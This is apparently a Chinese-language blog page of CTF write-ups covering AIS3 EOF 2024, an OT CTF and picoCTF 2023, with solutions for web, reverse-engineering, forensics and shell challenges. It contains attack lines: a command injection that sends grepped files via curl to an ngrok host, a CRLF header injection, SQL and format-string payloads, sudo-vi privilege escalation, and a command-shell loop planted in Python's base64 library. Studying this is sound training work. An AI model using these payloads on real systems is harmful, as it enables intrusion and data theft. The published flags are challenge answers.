<span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line">cipher=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlO</span></span><br><span class="line"><span class="string">aC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1Ja</span></span><br><span class="line"><span class="string">OGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">cipher=cipher.encode()</span><br><span class="line">cipher=base64.b64decode(cipher)</span><br><span class="line">salt=cipher[:<span class="number">16</span>]</span><br><span class="line">cipher=cipher[<span class="number">16</span>:]</span><br><span class="line"><span class="built_in">print</span>(salt)</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line">leak_password = <span class="string">&#x27;mysecretpassword&#x27;</span></span><br><span class="line">key = PBKDF2(leak_password.encode(), salt, <span class="number">32</span>, count=<span class="number">1000</span>, hmac_hash_module=SHA256)  </span><br><span class="line">f = Fernet(base64.urlsafe_b64encode(key))  </span><br><span class="line">plaintext=f.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>FLAG{W3lc0m3_t0_th3_CTF_W0rld_!!<em>!!!</em>!}</p>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2024-02-06T13:09:56.000Z" title="2024/2/6 下午9:09:56">2024-02-06</time>發表</span><span class="level-item"><time dateTime="2024-05-28T10:00:12.000Z" title="2024/5/28 下午6:00:12">2024-05-28</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/CTF/">CTF</a></span><span class="level-item">4 分鐘讀完 (大約559個字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/02/06/2024-AIS3-EOF-CTF-Qual-writeup/">2024 AIS3 EOF CTF Qual writeup</a></p><div class="content"><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="nslookup-final"><a href="#nslookup-final" class="headerlink" title="nslookup final"></a>nslookup final</h3><p>有command injection，用&#96;&#96;把指令包起來，但是會有一個問題就是他不會回傳結果，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl webhook.trianglesnake.com/?text=123</span><br></pre></td></tr></table></figure>

<p>呼叫聊天機器人webhook試試看，有收到訊息，所以直接把flag偷出來</p>
<p>因為有WAF限制<code>flag</code>、<code>*</code>，但我知道flag的prefix了，所以直接遍歷根目錄檔案找出flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`curl -G https://eec1-182-234-154-17.ngrok-free.app/ --data-urlencode </span><br><span class="line"><span class="string">&quot;<span class="subst">$(find / -maxdepth 1 -type f -exec grep &#x27;ais3&#x27; &#123;&#125; +)</span>&quot;</span>`</span><br></pre></td></tr></table></figure>

<blockquote>
<p>AIS3{jUST_3a$y_cOMmaND_INj3c7I0N}</p>
</blockquote>
<h3 id="internal"><a href="#internal" class="headerlink" title="internal"></a>internal</h3><p>沒辦法碰到<code>/flag</code>但是如果由內網機器送redirect請求並包含<code>X-Accel-Redirect</code>header就可以穿透。</p>
<p>這題在考crlf截斷，截斷之後可以header injection</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.105.0.21:11580/?redir=https://www.google.com%0d%0aX-Accel-Redirect:%20/flag</span><br></pre></td></tr></table></figure>

<blockquote>
<p>AIS3{JUsT_s0m3_FUnNy_N91NX_FEaturE}</p>
</blockquote>
<h3 id="copypasta"><a href="#copypasta" class="headerlink" title="copypasta"></a>copypasta</h3><p>題目有sql injection，用sqlmap dump出所有column後可以直接存取&#x2F;posts&#x2F;flag_id，但他會檢查cookie，所以絲路變成：透過sql injection創建不存在的貼文-&gt;透過string format撈出<code>app.secret_key</code>-&gt;偽造cookie-&gt;存取flag頁面</p>
<h4 id="透過sql-injection創造貼文"><a href="#透過sql-injection創造貼文" class="headerlink" title="透過sql injection創造貼文"></a>透過sql injection創造貼文</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#source code</span></span><br><span class="line">tmpl = db().cursor().execute(</span><br><span class="line">        <span class="string">f&quot;SELECT * FROM copypasta_template WHERE id = <span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&quot;</span></span><br><span class="line">    ).fetchone()</span><br></pre></td></tr></table></figure>
<p>這裡很明顯留了一個洞給我們</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;&#123;field.__class__....&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>此時下面進行format string的時候就會被injection</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res = content.<span class="built_in">format</span>(field=request.form)</span><br></pre></td></tr></table></figure>

<p>這題沒有做出來，卡在Pyton format string漏洞，可以摸到magic method，但是因為在不同namespace沒辦法用__global__撈到<code>app.secret_key</code></p>
<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="stateful"><a href="#stateful" class="headerlink" title="stateful"></a>stateful</h3><p>把整個流程反過來做一次 真reversed engineering<br>先用ghidra把C弄出來後用vs code 的取代把每個function改成printf，之後用python把出來的function整個反過來</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">3618225054(k_target)</span></span><br><span class="line"><span class="string">2057902921(k_target)</span></span><br><span class="line"><span class="string">671274660(k_target)</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">557589375(k_target)</span></span><br><span class="line"><span class="string">3420754995(k_target)</span></span><br><span class="line"><span class="string">3648003850(k_target)</span></span><br><span class="line"><span class="string">1978986903(k_target)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">lst = string.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">lst.reverse()</span><br><span class="line"><span class="built_in">print</span>(lst)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;state_&#x27;</span>+i+<span class="string">&#x27;;&#x27;</span>)</span><br></pre></td></tr></table></figure>


<p>把每個狀態機的function<code>+</code>改成<code>-</code>，然後把<code>k_target</code>逆向回推</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hello world! Cplayground is an online sandbox that makes it easy to try out</span></span><br><span class="line"><span class="comment">// code.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> local_14 = <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> local_10 = <span class="number">0</span>;</span><br><span class="line">  <span class="type">unsigned</span> local_c = <span class="number">0xd7a9bb9e</span>;</span><br><span class="line">  <span class="type">bool</span> bVar1 = <span class="literal">false</span>;</span><br><span class="line">  <span class="type">char</span> k_target[<span class="number">43</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">38</span>,</span><br><span class="line">  <span class="number">75</span>,</span><br><span class="line">  ...</span><br><span class="line">  <span class="number">128</span>,</span><br><span class="line">  <span class="number">101</span>,</span><br><span class="line">  <span class="number">-20</span>,</span><br><span class="line">  <span class="number">125</span></span><br><span class="line">&#125;;</span><br><span class="line">  </span><br><span class="line">state_1978986903(k_target);</span><br><span class="line">state_3648003850(k_target);</span><br><span class="line">state_3420754995(k_target);</span><br><span class="line">state_557589375(k_target);</span><br><span class="line">...</span><br><span class="line">state_2057902921(k_target);</span><br><span class="line">state_3618225054(k_target);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">44</span>;i++)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,k_target[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>基本上就是反著做一遍</p>
<blockquote>
<p>AIS3{Ar3_y0U_@_sTAtEfuL_Or_S7AT3L3SS_ctfer}</p>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-12-20T02:25:29.000Z" title="2023/12/20 上午10:25:29">2023-12-20</time>發表</span><span class="level-item"><time dateTime="2024-04-30T07:21:03.000Z" title="2024/4/30 下午3:21:03">2024-04-30</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/CTF/">CTF</a></span><span class="level-item">2 分鐘讀完 (大約305個字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/12/20/OT-CTF-writeup/">OT CTF writeup</a></p><div class="content"><h2 id="惡意軟體分析"><a href="#惡意軟體分析" class="headerlink" title="惡意軟體分析"></a>惡意軟體分析</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||10.15.1.69:3128||<br>難度:中</p>
</blockquote>
<ol>
<li>打開ida pro</li>
<li>查看import table</li>
<li>查看是否有網路連線相關api</li>
<li>查看 WinHttpOpen functoin的Reference</li>
<li>在edi中找到中繼伺服器ip和port</li>
</ol>
<h2 id="惡意軟體分析2"><a href="#惡意軟體分析2" class="headerlink" title="惡意軟體分析2"></a>惡意軟體分析2</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||flag{5.39.218.152}||</p>
</blockquote>
<h2 id="加密系統"><a href="#加密系統" class="headerlink" title="加密系統"></a>加密系統</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||flag_EnCryp1||<br>難度:難</p>
</blockquote>
<ol>
<li>使用<a href="factordb.com">factordb.com</a>分解n</li>
<li>因為e是2，所以不可能為RSA，猜測為rabin算法</li>
<li>有$p、q$了，所以順著把$m_p、m_q$求出來，會有四組明文</li>
<li>找可以讀的明文就是flag了</li>
</ol>
<h2 id="工業app分析"><a href="#工業app分析" class="headerlink" title="工業app分析"></a>工業app分析</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||Flag {g6ghfchijv55fhh8gdd}||<br>難度:易</p>
</blockquote>
<ol>
<li>題目有附apktool，用apktool decode apk</li>
<li>摸一摸就找到flag了</li>
</ol>
<h2 id="Level-L-Modbus異常封包"><a href="#Level-L-Modbus異常封包" class="headerlink" title="Level_L] Modbus異常封包"></a>Level_L] Modbus異常封包</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||THISISAOTCTFEASYFLAG||<br>難度:易</p>
</blockquote>
<ol>
<li>題目說是意外擲回，直接用filter過濾exception</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modbus.exception_code</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>查看request內容<br><img src="https://hackmd.io/_uploads/ry-moCTBp.png" alt="image"></li>
</ol>
<h2 id="Level-L-Modbus異常封包-1"><a href="#Level-L-Modbus異常封包-1" class="headerlink" title="Level_L] Modbus異常封包"></a>Level_L] Modbus異常封包</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||AN APPLE A DAY KEEPS THE DOCTOR AWAY||<br>難度:易</p>
</blockquote>
<ol>
<li>藏訊息發給PLC，若沒有拆開封包<code>length</code>一定會很長</li>
<li>找<code>length</code>最長的封包</li>
</ol>
<p><img src="https://hackmd.io/_uploads/By1piR6rp.png" alt="image"></p>
<blockquote>
<p>比別的封包多一坨hex的資料</p>
</blockquote>
<ol start="3">
<li>把hex轉成ascii，得到flag</li>
</ol>
<p><img src="https://hackmd.io/_uploads/HkGAG01PT.png" alt="image"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-05-29T12:31:19.000Z" title="2023/5/29 下午8:31:19">2023-05-29</time>發表</span><span class="level-item"><time dateTime="2024-04-30T07:21:07.000Z" title="2024/4/30 下午3:21:07">2024-04-30</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/CTF/">CTF</a></span><span class="level-item">12 分鐘讀完 (大約1813個字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/05/29/picoCTF-writeup/">picoCTF 2023 writeup</a></p><div class="content"><h2 id="Binary-Exploitation"><a href="#Binary-Exploitation" class="headerlink" title="Binary Exploitation"></a>Binary Exploitation</h2><h3 id="hijacking"><a href="#hijacking" class="headerlink" title="hijacking"></a>hijacking</h3><pre><code>AUTHOR: THEONESTE BYAGUTANGAZA

Description
Getting root access can allow you to read the flag. Luckily there is a 
python file that you might like to play with.
Through Social engineering, we&#39;ve got the credentials to use on the 
server. SSH is running on the server.
</code></pre>
<h4 id="隨便逛逛"><a href="#隨便逛逛" class="headerlink" title="隨便逛逛"></a>隨便逛逛</h4><p><img src="https://hackmd.io/_uploads/BkCIB9eLh.png"><br>發現&#x2F;challenge資料夾很可疑，但是沒辦法cd進去</p>
<p><img src="https://hackmd.io/_uploads/BJpdBcgIn.png"></p>
<p>查看sudo 發現使用者可以用sudo權限使用vi<br><img src="https://hackmd.io/_uploads/Hy6NrclIn.png"></p>
<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vi</span><br><span class="line"></span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/rkEI89xI3.png"><br>privilege escalation了，再來就直接A進去&#x2F;challenge&#x2F;把flag撈出來就好</p>
<p><img src="https://hackmd.io/_uploads/rkETIce8h.png"></p>
<blockquote>
<p>picoCTF{pYth0nn_libraryH!j@CK!n9_5a7b5866}</p>
</blockquote>
<h4 id="原本解法"><a href="#原本解法" class="headerlink" title="原本解法"></a>原本解法</h4><pre><code>這題當初在解的時候是在.server.py裡面import 的base64裡面搞鬼
只是不知道為甚麼在寫writeup的時候沒辦法用root權限執行.server.py
</code></pre>
<p>先<code>ls -al</code>發現有一個<code>.server.py</code></p>
<p><code>cat .server.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">ip = <span class="string">&#x27;picoctf.org&#x27;</span></span><br><span class="line">response = os.system(<span class="string">&quot;ping -c 1 &quot;</span> + ip)</span><br><span class="line"><span class="comment">#saving ping details to a variable</span></span><br><span class="line">host_info = socket.gethostbyaddr(ip)</span><br><span class="line"><span class="comment">#getting IP from a domaine</span></span><br><span class="line">host_info_to_str = <span class="built_in">str</span>(host_info[<span class="number">2</span>])</span><br><span class="line">host_info = base64.b64encode(host_info_to_str.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello, this is a part of information gathering&quot;</span>,<span class="string">&#x27;Host: &#x27;</span>, host_info)</span><br></pre></td></tr></table></figure>

<p><code>vim .server.py</code>沒辦法動<code>.server.py</code>，因為他是readonly，但是權限沒有設定到<code>base64.py</code></p>
<p><strong>在import file裡面加料</strong><br><code>vim /usr/lib/python3.8/base64.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    cmd=<span class="built_in">input</span>()</span><br><span class="line">    <span class="built_in">print</span>(os.popen(cmd).read())</span><br></pre></td></tr></table></figure>

<p><strong>get shell</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 .server.py</span><br></pre></td></tr></table></figure>

<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="hideme"><a href="#hideme" class="headerlink" title="hideme"></a>hideme</h3><pre><code>AUTHOR: GEOFFREY NJOGU

Description
Every file gets a flag.
The SOC analyst saw one image been sent back and forth between two
people. They decided to investigate and found out that there was more
than what meets the eye here.
</code></pre>
<p>下載下來發現是一張圖片<br>看一看感覺很正常</p>
<p>用<code>exiftool</code>看了一下沒有把flag藏在某個欄位裡</p>
<p><code>strings flag.png</code>看看<br><img src="https://hackmd.io/_uploads/BkC8pqxIn.png"><br>發現裡面有長得很像路徑的東東</p>
<p>直接把<code>flag.png</code>當成zip解壓縮看看</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip flag.png</span><br></pre></td></tr></table></figure>
<p>得到半張flag<br><img src="https://hackmd.io/_uploads/r1xCia5lI2.png"></p>
<blockquote>
<p>picoCTF{Hiddinng_An_imag3_within_@n_ima9e_92076717}</p>
</blockquote>
<h3 id="FindAndOpen"><a href="#FindAndOpen" class="headerlink" title="FindAndOpen"></a>FindAndOpen</h3><pre><code>AUTHOR: MUBARAK MIKAIL

Description
Someone might have hidden the password in the trace file.
Find the key to unlock this file. This tracefile might be good to analyze.
</code></pre>
<p>這題給了兩個檔案，第一個是<code>flag.zip</code>和<code>dump.pcap</code>。<br>嘗試解壓縮<code>flag.zip</code>，發現需要密碼</p>
<h4 id="先從dump-pcap下手看看"><a href="#先從dump-pcap下手看看" class="headerlink" title="先從dump.pcap下手看看"></a>先從<code>dump.pcap</code>下手看看</h4><p>用wireshark打開<code>dump.pcap</code></p>
<p><img src="https://hackmd.io/_uploads/r11qn2eL2.png"><br>隨便看幾個封包後發現都有明文</p>
<p><img src="https://hackmd.io/_uploads/SyH7T2lUh.png"><br>找到一個超可疑的封包，<code>=</code>結尾很可能是base64編碼的填充字元</p>
<p>decode後得到半截flag</p>
<blockquote>
<p>This is the secret: picoCTF{R34DING_LOKd_</p>
</blockquote>
<p>回到<code>flag.zip</code>，直接通靈把第一段flag當密碼</p>
<blockquote>
<p>picoCTF{R34DING_LOKd_fil56_succ3ss_5ed3a878}</p>
</blockquote>
<p>??</p>
<h2 id="General-Skills"><a href="#General-Skills" class="headerlink" title="General Skills"></a>General Skills</h2><h3 id="money-ware"><a href="#money-ware" class="headerlink" title="money-ware"></a>money-ware</h3><pre><code>AUTHOR: JUNI19

Description
Flag format: picoCTF&#123;Malwarename&#125;
The first letter of the malware name should be capitalized and the rest 
lowercase.
Your friend just got hacked and has been asked to pay some bitcoins to 
1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX. He doesn’t seem to understand what is 
going on and asks you for advice. Can you identify what malware he’s 
being a victim of?
</code></pre>
<p>Google <code>1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX</code></p>
<p>找到<a target="_blank" rel="noopener" href="https://www.cnbc.com/2017/06/28/ransomware-cyberattack-petya-bitcoin-payment.html">CNBC的新聞</a><br><img src="https://hackmd.io/_uploads/SkJ-yplUn.png"></p>
<blockquote>
<p>picoCTF{Petya}</p>
</blockquote>
<p>水爛</p>
<h3 id="repetitions"><a href="#repetitions" class="headerlink" title="repetitions"></a>repetitions</h3><pre><code>AUTHOR: THEONESTE BYAGUTANGAZA

Description
Can you make sense of this file?
Download the file here.
</code></pre>
<p>下載<code>enc_flag</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVh</span><br><span class="line">RmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNk</span><br><span class="line">MlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVW</span><br><span class="line">VkpEVGxaYVdFMVhSbFZhTTBKWVZGWmFXbVZzV2tkWk0yaFRDbUpXV25sVVZtaFRWMGRHZEdWRlZs</span><br><span class="line">aGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg==</span><br></pre></td></tr></table></figure>
<p>&#x3D;&#x3D;經典base64</p>
<p>decode後</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">VjFSQ2EyTXlSblJUV0dSVllrWmFWRmx0TlZOalJtUlhZVVU1YVZKVVZuaFdWekZoWVZkR2NrNVVX</span><br><span class="line">bUZTVmtwUVdWUkdibVZXVm5WUgpiSEJzWVRCd2VWVXhXbXBOUlRWSFdqTnNWZ3BYUjFKeVZGZHdW</span><br><span class="line">MlZzVWxaVmJFNW9UVVJDTlZaWE1XRlVaM0JYVFZaWmVsWkdZM2hTCmJWWnlUVmhTV0dGdGVFVlhi</span><br><span class="line">bTkzVDFWT2JsQlVNRXNLCg==</span><br></pre></td></tr></table></figure>

<p>再decode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">V1RCa2MyRnRTWGRVYkZaVFltNVNjRmRXYUU5aVJUVnhWVzFhYVdGck5UWmFSVkpQWVRGbmVWVnVR</span><br><span class="line">bHBsYTBweVUxWmpNRTVHWjNsVgpXR1JyVFdwV2VsUlZVbE5oTURCNVZXMWFUZ3BXTVZZelZGY3hS</span><br><span class="line">bVZyTVhSWGFteEVXbm93T1VOblBUMEsK</span><br></pre></td></tr></table></figure>

<p>de</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WTBkc2FtSXdUbFZTYm5ScFdWaE9iRTVxVW1aaWFrNTZaRVJPYTFneVVuQlpla0pyU1ZjME5GZ3lV</span><br><span class="line">WGRrTWpWelRVUlNhMDB5VW1aTgpWMVYzVFcxRmVrMXRXamxEWnowOUNnPT0K</span><br></pre></td></tr></table></figure>
<p>deeee</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Y0dsamIwTlVSbnRpWVhObE5qUmZiak56ZEROa1gyUnBZekJrSVc0NFgyUXdkMjVzTURSa00yUmZN</span><br><span class="line">V1V3TW1Fek1tWjlDZz09Cg==</span><br></pre></td></tr></table></figure>

<p>eeeeeeee</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cGljb0NURntiYXNlNjRfbjNzdDNkX2RpYzBkIW44X2Qwd25sMDRkM2RfMWUwMmEzMmZ9Cg==</span><br></pre></td></tr></table></figure>
<p>aaaaaaaaaa</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;base64_n3st3d_dic0d!n8_d0wnl04d3d_1e02a32f&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://media.tenor.com/eipo4TRTSKwAAAAd/moe-simpsons-barney-e-moe.gif"></p>
<blockquote>
<p>picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_1e02a32f}</p>
</blockquote>
<h3 id="Permissions"><a href="#Permissions" class="headerlink" title="Permissions"></a>Permissions</h3><pre><code>AUTHOR: GEOFFREY NJOGU

Description
Can you read files in the root file?
The system admin has provisioned an account for you on the main server:
ssh -p 53849 picoplayer@saturn.picoctf.net
Password: x+T6aPgE4-
Can you login and read the root file?    
</code></pre>
<p><img src="https://hackmd.io/_uploads/B1xxDTeI2.png"></p>
<blockquote>
<p>picoCTF{uS1ng_v1m_3dit0r_f6ad392b}</p>
</blockquote>
<p>水爛</p>
<h3 id="chrono"><a href="#chrono" class="headerlink" title="chrono"></a>chrono</h3><pre><code>AUTHOR: MUBARAK MIKAIL

Description
How to automate tasks to run at intervals on linux servers?
Use ssh to connect to this server:
Server: saturn.picoctf.net
Port: 50602
Username: picoplayer 
Password: tPmsUpiHeZ
</code></pre>
<p><img src="https://hackmd.io/_uploads/ByLMuagIn.png"></p>
<blockquote>
<p>picoCTF{Sch3DUL7NG_T45K3_L1NUX_0bb95b71}</p>
</blockquote>
<p>?</p>
<h3 id="useless"><a href="#useless" class="headerlink" title="useless"></a>useless</h3><pre><code>AUTHOR: LOIC SHEMA

Description
There&#39;s an interesting script in the user&#39;s home directory
Additional details will be available after launching your challenge instance.
</code></pre>
<p><img src="https://hackmd.io/_uploads/HkhIYaeIn.png"></p>
<blockquote>
<p>picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_6173}</p>
</blockquote>
<h3 id="Special"><a href="#Special" class="headerlink" title="Special"></a>Special</h3><pre><code>AUTHOR: LT &#39;SYREAL&#39; JONES

Description
Don&#39;t power users get tired of making spelling mistakes in the shell? Not
anymore! Enter Special, the Spell Checked Interface for Affecting Linux.
Now, every word is properly spelled and capitalized... automatically and 
behind-the-scenes! Be the first to test Special in beta, and feel free to
tell us all about how Special streamlines every development process that
you face. When your co-workers see your amazing shell interface, just
tell them: That&#39;s Special (TM)
Start your instance to see connection details.
Additional details will be available after launching your challenge
instance.
</code></pre>
<p>這題會一直把輸入的指令變成很簡單的單字，然後把開頭用成大寫<br><code>ls</code>會變<code>Is</code><br><code>cat</code>會變<code>Cat</code>，但如果不是第一個字母就不會變大寫，所以可以用cat指令<br>用<code>;</code> 搭配Regex Command Injection</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat;cat *</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/SJMKTpxLh.png"><br>發現目錄下面有一個資料夾<code>blargh</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat;cat blargh/*</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/SyasaagIn.png"></p>
<blockquote>
<p>picoCTF{5p311ch3ck_15_7h3_w0r57_f578af59}</p>
</blockquote>
<h2 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h2><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><pre><code>AUTHOR: MUBARAK MIKAIL

Description
Try reversing this file? Can ya?
I forgot the password to this file. Please find it for me?
